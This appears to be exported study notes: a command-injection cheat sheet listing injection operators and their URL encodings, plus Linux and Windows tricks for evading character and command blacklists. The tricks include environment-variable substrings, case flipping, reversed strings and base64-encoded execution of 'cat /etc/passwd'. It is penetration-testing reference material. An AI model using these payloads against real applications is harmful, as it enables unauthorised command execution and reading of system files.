<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Cheat Sheet</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Cheat Sheet</h1><br/><br />Links:<br />• PayloadAllTheThings: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</a><br /><br /><strong><h2>Injection Operators</h2></strong><br /><table class="table"><tr><th>Injection Operator</th><th>Injection Character</th><th>URL-Encoded Character</th><th>Executed Command</th></tr><tr><td>Semicolon</td><td>;</td><td>%3b</td><td>Both</td></tr><tr><td>New Line</td><td>\n</td><td>%0a</td><td>Both</td></tr><tr><td>Background</td><td>&amp;</td><td>%26</td><td>Both (second output generally shown first)</td></tr><tr><td>Pipe</td><td>|</td><td>%7c</td><td>Both (only second output is shown)</td></tr><tr><td>AND</td><td>&amp;&amp;</td><td>%26%26</td><td>Both (only if first succeeds)</td></tr><tr><td>OR</td><td>||</td><td>%7c%7c</td><td>Second (only if first fails)</td></tr><tr><td>Sub-Shell</td><td>``</td><td>%60%60</td><td>Both (Linux-only)</td></tr><tr><td>Sub-Shell</td><td>$()</td><td>%24%28%29</td><td>Both (Linux-only)</td></tr></table><br /><br /><br /><strong><h1>Linux</h1></strong><strong>: <br />• </strong><strong><h2>Filtered Character Bypass</h2></strong><br /><table class="table"><tr><th>Code</th><th>Description</th></tr><tr><td>printenv</td><td>Can be used to view all environment variables</td></tr></table><br /><table class="table"><tr><th>Spaces</th><th> </th></tr><tr><td>%09</td><td>Using tabs instead of spaces</td></tr><tr><td>${IFS}</td><td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $())</td></tr><tr><td>{ls,-la}</td><td>Commas will be replaced with spaces</td></tr></table><br /><table class="table"><tr><th>Other Characters</th><th> </th></tr><tr><td>${PATH:0:1}</td><td>Will be replaced with /</td></tr><tr><td>${LS_COLORS:10:1}</td><td>Will be replaced with ;</td></tr><tr><td>$(tr &#39;!-}&#39; &#39;&quot;-~&#39;&lt;&lt;&lt;[)</td><td>Shift character by one ([ -&gt; \)</td></tr></table><br /><br /><br />• <strong><h2>Blacklisted Command Bypass</h2></strong><br /><table class="table"><tr><th>Code</th><th>Description</th></tr></table><br /><table class="table"><tr><th>Character Insertion</th><th> </th></tr><tr><td>&#39; or &quot;</td><td>Total must be even</td></tr><tr><td>$@ or \</td><td>Linux only</td></tr></table><br /><table class="table"><tr><th>Case Manipulation</th><th> </th></tr><tr><td>$(tr &quot;[A-Z]&quot; &quot;[a-z]&quot;&lt;&lt;&lt;&quot;WhOaMi&quot;)</td><td>Execute command regardless of cases</td></tr><tr><td>$(a=&quot;WhOaMi&quot;;printf %s &quot;${a,,}&quot;)</td><td>Another variation of the technique</td></tr></table><br /><table class="table"><tr><th>Reversed Commands</th><th> </th></tr><tr><td>echo &#39;whoami&#39; | rev</td><td>Reverse a string</td></tr><tr><td>$(rev&lt;&lt;&lt;&#39;imaohw&#39;)</td><td>Execute reversed command</td></tr></table><br /><table class="table"><tr><th>Encoded Commands</th><th> </th></tr><tr><td>echo -n &#39;cat /etc/passwd | grep 33&#39; | base64</td><td>Encode a string with base64</td></tr><tr><td>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</td><td>Execute b64 encoded string</td></tr></table><br /><br /><br /><br /><strong><h1>Windows</h1></strong><strong>:<br />•  </strong><strong><h2>Filtered Character Bypass</h2></strong><br /><table class="table"><tr><th>Code</th><th>Description</th></tr><tr><td>Get-ChildItem Env:</td><td>Can be used to view all environment variables - (PowerShell)</td></tr></table><br /><table class="table"><tr><th>Spaces</th><th> </th></tr><tr><td>%09</td><td>Using tabs instead of spaces</td></tr><tr><td>%PROGRAMFILES:~10,-5%</td><td>Will be replaced with a space - (CMD)</td></tr><tr><td>$env:PROGRAMFILES[10]</td><td>Will be replaced with a space - (PowerShell)</td></tr></table><br /><table class="table"><tr><th>Other Characters</th><th> </th></tr><tr><td>%HOMEPATH:~0,-17%</td><td>Will be replaced with \ - (CMD)</td></tr><tr><td>$env:HOMEPATH[0]</td><td>Will be replaced with \ - (PowerShell)</td></tr></table><br /><br />• <strong><h2>Blacklisted Command Bypass</h2></strong><br /><table class="table"><tr><th>Code</th><th>Description</th></tr></table><br /><table class="table"><tr><th>Character Insertion</th><th> </th></tr><tr><td>&#39; or &quot;</td><td>Total must be even</td></tr><tr><td>^</td><td>Windows only (CMD)</td></tr></table><br /><table class="table"><tr><th>Case Manipulation</th><th> </th></tr><tr><td>WhoAmi</td><td>Simply send the character with odd cases</td></tr></table><br /><table class="table"><tr><th>Reversed Commands</th><th> </th></tr><tr><td>&quot;whoami&quot;[-1..-20] -join &#39;&#39;</td><td>Reverse a string</td></tr><tr><td>iex &quot;$(&#39;imaohw&#39;[-1..-20] -join &#39;&#39;)&quot;</td><td>Execute reversed command</td></tr></table><br /><table class="table"><tr><th>Encoded Commands</th><th> </th></tr><tr><td>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#39;whoami&#39;))</td><td>Encode a string with base64</td></tr><tr><td>iex &quot;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;dwBoAG8AYQBtAGkA&#39;)))&quot;</td><td>Execute b64 encoded string</td></tr></table><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div>
</body>
</html>
